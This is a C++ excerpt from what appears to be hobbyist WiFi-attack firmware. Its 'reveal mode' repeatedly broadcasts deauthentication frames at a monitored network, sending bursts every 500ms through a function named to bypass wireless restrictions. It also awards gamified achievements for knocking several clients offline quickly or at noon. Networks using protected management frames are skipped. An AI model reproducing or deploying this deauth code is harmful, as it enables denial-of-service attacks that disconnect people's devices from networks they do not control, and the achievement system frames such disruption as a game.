    uint32_t now = millis();
    
    // DEAD_EYE: Deauth within 2 seconds of entering monitor
    if (clientMonitorEntryTime > 0 && (now - clientMonitorEntryTime) < 2000) {
        if (!XP::hasAchievement(ACH_DEAD_EYE)) {
            XP::unlockAchievement(ACH_DEAD_EYE);
        }
    }
    
    // HIGH_NOON: Deauth during noon hour (12:00-12:59)
    time_t nowTime = time(nullptr);
    if (nowTime > 1700000000) {  // Valid time (after 2023)
        struct tm* timeinfo = localtime(&nowTime);
        if (timeinfo && timeinfo->tm_hour == 12) {
            if (!XP::hasAchievement(ACH_HIGH_NOON)) {
                XP::unlockAchievement(ACH_HIGH_NOON);
            }
        }
    }
    
    // QUICK_DRAW: Deauth 5 clients in under 30 seconds
    deauthsThisMonitor++;
    if (deauthsThisMonitor == 1) {
        firstDeauthTime = now;  // Start the timer on first deauth
    }
    if (deauthsThisMonitor >= 5 && (now - firstDeauthTime) < 30000) {
        if (!XP::hasAchievement(ACH_QUICK_DRAW)) {
            XP::unlockAchievement(ACH_QUICK_DRAW);
        }
    }
    
    busy = false;
}

// Enter reveal mode - broadcast deauth to discover clients
void SpectrumMode::enterRevealMode() {
    if (revealingClients) return;
    
    // Check PMF - warn if network is protected
    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
        if (networks[monitoredNetworkIndex].hasPMF) {
            Display::showToast("PMF PROTECTED");
            return;
        }
    }
    
    revealingClients = true;
    revealStartTime = millis();
    lastRevealBurst = 0;
    
    // Sound feedback - non-blocking
    SFX::play(SFX::REVEAL_START);
}

// Exit reveal mode
void SpectrumMode::exitRevealMode() {
    if (!revealingClients) return;
    
    revealingClients = false;
    
    // Report how many clients found
    int clientCount = 0;
    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
        clientCount = networks[monitoredNetworkIndex].clientCount;
    }
    
    char msg[24];
    snprintf(msg, sizeof(msg), "FOUND %d CLIENTS", clientCount);
    Display::showToast(msg);
}

// Update reveal mode - send periodic broadcast deauths
void SpectrumMode::updateRevealMode() {
    if (!revealingClients) return;
    
    uint32_t now = millis();
    
    // Auto-exit after 10 seconds
    if (now - revealStartTime > 10000) {
        exitRevealMode();
        return;
    }
    
    // Send broadcast deauth every 500ms
    if (now - lastRevealBurst >= 500) {
        lastRevealBurst = now;
        
        if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
            const auto& net = networks[monitoredNetworkIndex];
            const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            
            // Send 3 broadcast deauths
            for (int i = 0; i < 3; i++) {
                WSLBypasser::sendDeauthFrame(net.bssid, net.channel, broadcast, 7);
                delay(5);
            }
            
            // Pulse beep during reveal - disabled to avoid audio spam
            // SFX handles reveal start sound
        }
    }
}
